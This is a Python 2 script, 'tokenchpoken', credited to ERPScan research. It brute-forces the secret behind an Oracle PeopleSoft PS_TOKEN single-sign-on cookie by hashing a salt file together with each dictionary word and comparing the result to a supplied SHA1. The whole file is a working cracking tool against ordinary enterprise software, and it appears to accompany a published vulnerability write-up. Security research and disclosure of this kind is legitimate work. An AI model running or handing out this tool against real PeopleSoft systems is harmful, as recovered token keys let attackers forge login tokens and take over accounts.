#!/usr/bin/python
import hashlib
import argparse
import time
import codecs

start_time = time.time()

"""
Credit: erpscan
https://erpscan.com/press-center/blog/peoplesoft-security-part-3-peoplesoft-sso-tokenchpoken-attack/
"""

print
print 'tokenchpoken v0.5 beta '
print 'Oracle PS_TOKEN cracker. Token bruter'
print
print 'Alexey Tyurin - a.tyurin at erpscan.com'
print 'ERPScan Research Group - http://www.erpscan.com'
print


parser = argparse.ArgumentParser()
parser.add_argument('-s', action='store', dest='sha', required=True, help='Set a SHA1 hash value from PS_TOKEN')
#parser.add_argument('-e', action='store', dest='end', required=True, help='Set an endianness of PS_TOKEN (0-little,1-big)')
parser.add_argument('-f', action='store', dest='filename', default="salt.txt", required=True, help='Set a path to a file with the decompressed PS_TOKEN (from parse.py - salt.txt)')
parser.add_argument('-d', action='store', dest='dictionary', required=True, help='Set a path to a dictionary')
parser.add_argument('-v', action='store', dest='verbose', default=False, help='Be more verbose and show the token\'s headers')

args = parser.parse_args()

with open(args.filename,"r") as f:
    try:
        salt = f.read()
        f.close()
    except :
        print "Coudn't open a file ", args.filename
        exit()

sha_token=args.sha
print "SHA1 from PS_TOKEN:"
print sha_token

if args.verbose:
    print "PS_TOKEN \"salt\":"
    print salt

print

with codecs.open(args.dictionary,"r", encoding='utf-8', errors='ignore') as d:
    try:
        print "Let's begin..."
        for password in d:
            password=password.rstrip()
            #print password.encode('hex')
            password=password.encode('utf_16_le', errors='ignore')
            #print password.encode('hex')
            new_hash=hashlib.sha1(salt+password).hexdigest()
            if args.verbose:
                print "Trying password ", password
                print new_hash
            if new_hash==sha_token:
                print "Got it! ", password.replace('\x00', '')
                print "Fin"
                exit()

    except IOError:
        print "Coudn't open a file ", args.dictionary
        exit()

                
print("--- %s seconds ---" % str(time.time() - start_time))
print "Fin"
print 


